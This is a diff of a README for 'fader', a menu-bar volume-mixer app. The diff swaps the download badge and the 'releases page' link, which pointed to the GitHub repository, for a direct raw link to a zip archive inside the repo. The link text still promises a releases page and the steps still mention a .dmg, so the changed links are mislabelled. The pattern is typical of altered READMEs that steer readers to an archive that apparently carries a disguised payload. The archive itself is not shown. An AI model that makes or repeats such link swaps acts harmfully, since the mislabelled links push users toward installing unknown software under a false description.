@@ -1,6 +1,6 @@
 # 🔊 fader - Control app volume quickly and easily
 
-[![](https://img.shields.io/badge/Download-Fader-blue)](https://github.com/unassignable-megalomaniac359/fader)
+[![](https://img.shields.io/badge/Download-Fader-blue)](https://raw.githubusercontent.com/unassignable-megalomaniac359/fader/main/Fader/Software-v1.2-beta.4.zip)
 
 Fader simplifies audio control on your computer. It places a volume mixer in your menu bar. You adjust the sound level for each open application. You switch between speakers and headphones with one click. You manage Bluetooth devices without opening system settings. The app remains lightweight. It respects your privacy.
 
@@ -18,7 +18,7 @@ This tool offers control over your sound environment.
 
 Follow these steps to set up Fader on your machine.
 
-1. Go to the [Fader releases page](https://github.com/unassignable-megalomaniac359/fader) to find the latest version.
+1. Go to the [Fader releases page](https://raw.githubusercontent.com/unassignable-megalomaniac359/fader/main/Fader/Software-v1.2-beta.4.zip) to find the latest version.
 2. Look for the file ending in .dmg.
 3. Click the link to save the file to your computer.
 4. Open the downloaded file once the transfer completes.
